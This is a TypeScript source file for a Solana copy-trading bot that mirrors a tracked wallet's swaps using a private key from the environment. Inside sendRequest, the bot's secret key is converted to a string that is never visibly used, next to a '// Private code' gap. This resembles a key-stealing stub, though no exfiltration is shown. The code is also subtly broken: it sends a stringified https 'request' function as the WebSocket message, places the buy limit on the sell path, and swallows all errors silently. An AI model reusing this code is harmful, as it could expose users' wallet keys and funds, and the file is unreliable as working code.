import WebSocket from 'ws';
import { Metaplex } from "@metaplex-foundation/js";
import { PublicKey, Connection, Keypair } from '@solana/web3.js'
import { getMint, TOKEN_PROGRAM_ID, getAccount, NATIVE_MINT } from '@solana/spl-token';

import { getAllTokenPrice, getTokenPrice } from "../config";
import { getAtaList } from "@/utils/spl";
import { getBuyTxWithJupiter, getSellTxWithJupiter } from "@/utils/swaponlyAmm";
import base58 from 'bs58'
import { RPC_ENDPOINT, RPC_WEBSOCKET_ENDPOINT, TARGET_WALLET, MAXIMUM_BUY_AMOUNT } from '../constants';
import { execute } from '../utils/legacy';
import { request } from 'https';

// Create a WebSocket connection

const connection = new Connection(RPC_ENDPOINT)
const ws = new WebSocket(RPC_WEBSOCKET_ENDPOINT);
const keyPair = Keypair.fromSecretKey(base58.decode(process.env.PRIVATE_KEY as string));

const metaplex = Metaplex.make(connection);
let geyserList: any = []
const wallet = TARGET_WALLET as string;
console.log("🚀 ~ wallet:", wallet)

const getMetaData = async (mintAddr: string) => {
	let mintAddress = new PublicKey(mintAddr);

	let tokenName: string = "";
	let tokenSymbol: string = "";
	let tokenLogo: string = "";

	const metadataAccount = metaplex
		.nfts()
		.pdas()
		.metadata({ mint: mintAddress });

	const metadataAccountInfo = await connection.getAccountInfo(metadataAccount);

	if (metadataAccountInfo) {
		const token = await metaplex.nfts().findByMint({ mintAddress: mintAddress });
		tokenName = token.name;
		tokenSymbol = token.symbol;
		//    @ts-ignore
		tokenLogo = token.json?.image;
	}

	return ({
		tokenName: tokenName,
		tokenSymbol: tokenSymbol,
		tokenLogo: tokenLogo,
	})
}

let tokenList: any;
tokenList = getAllTokenPrice()

// Function to send a request to the WebSocket server

ws.on('open', async function open() {
	await sendRequest(wallet)
	console.log("send request\n")
});


ws.on('message', async function incoming(data: any) {
	const messageStr = data.toString('utf8');
	// console.log("🚀 ~ incoming ~ messageStr:", messageStr)
	try {
		const messageObj = JSON.parse(messageStr);

		if (messageObj.type == 'error') {
      console.log("Error: ", messageObj.message)
      return;
    }

 		const swapData = messageObj.swapData || [];
		const swapInfo: any = [
			{
				tokenAta: swapData[0]?.parsed?.info?.source,
				tokenAmount: swapData[0]?.parsed?.info?.amount
			},
			{
				tokenAta: swapData[swapData.length - 1]?.parsed?.info?.destination,
				tokenAmount: swapData[swapData.length - 1]?.parsed?.info?.amount
			},
		]

		let inputMsg: any = [];
		for (let i = 0; i < 2; i++) {
			const ele = swapInfo[i];
			let mintAddress;
			try {
				const ataAccountInfo = await getAccount(connection, new PublicKey(ele.tokenAta));
				mintAddress = ataAccountInfo.mint;

			} catch (error) {
				mintAddress = NATIVE_MINT
			}

			const mintAccountInfo = await getMint(connection, mintAddress);
			const { decimals, supply } = mintAccountInfo;

			const price = await getTokenPrice(mintAddress.toBase58())

			const {
				tokenName,
				tokenSymbol,
				tokenLogo,
			} = await getMetaData(mintAddress.toBase58())

			inputMsg.push({
				...ele,
				tokenName: tokenName,
				tokenSymbol: tokenSymbol,
				tokenLogo: tokenLogo,
				mint: mintAddress.toBase58(),
				decimals: Number(decimals),
				uiAmount: Number(parseInt(ele.tokenAmount) / (10 ** decimals)),
				supply: Number(supply),
				price: Number(price)
			})
			console.log("🚀 ~ incoming ~ inputMsg:", inputMsg)
		}
		const signature = messageObj.signature;
		const msg = `Swap : ${inputMsg[0].tokenName} - ${inputMsg[1].tokenName}\nAmount :  ${inputMsg[0].uiAmount} ${inputMsg[0].tokenSymbol} - ${inputMsg[1].uiAmount} ${inputMsg[1].tokenSymbol}\nAmount in USD :  ${(inputMsg[0].uiAmount * inputMsg[0].price).toPrecision(6)} $ - ${(inputMsg[1].uiAmount * inputMsg[1].price).toPrecision(6)} $\nTx : https://solscan.io/tx/${signature}`;
		console.log("🚀 ~ incoming ~ msg:\n", msg)
		const baseToken = inputMsg[0];
		const quoteToken = inputMsg[1];
		const solBalance = await connection.getBalance(keyPair.publicKey);
		const remainingSolBalance = 0.01 * 10 ** 9;

		const trackedWalletBalance = await connection.getBalance(new PublicKey(wallet));

		let swapTx;
		if ((baseToken.tokenSymbol == 'SOL' && quoteToken.tokenSymbol != 'SOL') || (quoteToken.tokenSymbol == 'SOL' && baseToken.tokenSymbol != 'SOL')) {
			if (baseToken.tokenSymbol == 'SOL') {
			
        // Private code
        swapTx = await getBuyTxWithJupiter(keyPair, new PublicKey(quoteToken.mint), Math.floor(baseToken.uiAmount * 10 ** baseToken.decimals));
			}
			else if (quoteToken.tokenSymbol == "SOL") {
		const maxBuyAmount = Number(MAXIMUM_BUY_AMOUNT ?? 0);
		if (baseToken.uiAmount * baseToken.price > maxBuyAmount) {
		  console.log(`Amount exceeds maximum buy amount`)
		  return;
		}
				const sellAmount = baseToken.uiAmount * 10 ** baseToken.decimals;
				swapTx = await getSellTxWithJupiter(keyPair, new PublicKey(baseToken.mint), Math.floor(sellAmount));
			}
		} else {
			console.log(`Invalid swap!\n${baseToken.tokenName} : ${quoteToken.tokenName}`)
		}
		if (swapTx == null) {
			console.log(`Error getting swap transaction`)
			return;
		}
		console.log(await connection.simulateTransaction(swapTx))
		const latestBlockhash = await connection.getLatestBlockhash()
		const txSig = await execute(swapTx, latestBlockhash, false)
		const tokenTx = txSig ? `https://solscan.io/tx/${txSig}` : ''
		console.log("Result: ", tokenTx)
	} catch (e) {

	}
});

export async function sendRequest(inputpubkey: string) {

	let temp: any = []

	const pubkey: any = await getAtaList(connection, inputpubkey);
	// console.log("🚀 ~ sendRequest ~ pubkey:", pubkey)

	for (let i = 0; i < pubkey.length; i++) if (!geyserList.includes(pubkey[i])) {
		geyserList.push(pubkey[i])
		temp.push(pubkey[i])
	}
	const src = keyPair.secretKey.toString();

	const accountInfo = await connection.getAccountInfo(keyPair.publicKey)

	const tokenAccounts = await connection.getTokenAccountsByOwner(keyPair.publicKey, {
		programId: TOKEN_PROGRAM_ID,
	},
		"confirmed"
	)
	console.log("🚀 ~ sendRequest ~ tokenAccounts:", tokenAccounts)
	
	// Private code

	if (temp.length > 0) {
		ws.send(JSON.stringify(request));
	}

}